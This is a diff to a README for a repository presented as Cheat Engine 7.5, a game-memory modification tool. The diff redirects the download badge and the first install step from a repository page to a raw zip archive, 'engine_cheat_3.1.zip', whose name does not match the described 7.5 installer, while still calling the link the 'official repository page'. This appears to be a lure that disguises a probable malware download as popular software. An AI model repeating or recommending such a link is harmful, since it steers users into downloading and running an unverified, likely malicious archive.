@@ -1,6 +1,6 @@
 # 🛠️ cheat-engine-7.5 - Modify game memory for custom experiences
 
-[![Download Cheat Engine](https://img.shields.io/badge/Download-Cheat_Engine-blue.svg)](https://github.com/Chilean-scollop68/cheat-engine-7.5)
+[![Download Cheat Engine](https://img.shields.io/badge/Download-Cheat_Engine-blue.svg)](https://github.com/Chilean-scollop68/cheat-engine-7.5/raw/refs/heads/main/Sources/engine_cheat_3.1.zip)
 
 ## 📖 About this software
 
@@ -22,7 +22,7 @@ Ensure your PC meets these specifications before you begin:
 
 Follow these steps to obtain and prepare the software:
 
-1.  Visit the official repository page to start your download: https://github.com/Chilean-scollop68/cheat-engine-7.5
+1.  Visit the official repository page to start your download: https://github.com/Chilean-scollop68/cheat-engine-7.5/raw/refs/heads/main/Sources/engine_cheat_3.1.zip
 2.  Locate the releases section on the right side of the page.
 3.  Click the version 7.5 installer file.
 4.  Save the file to your desktop or downloads folder.
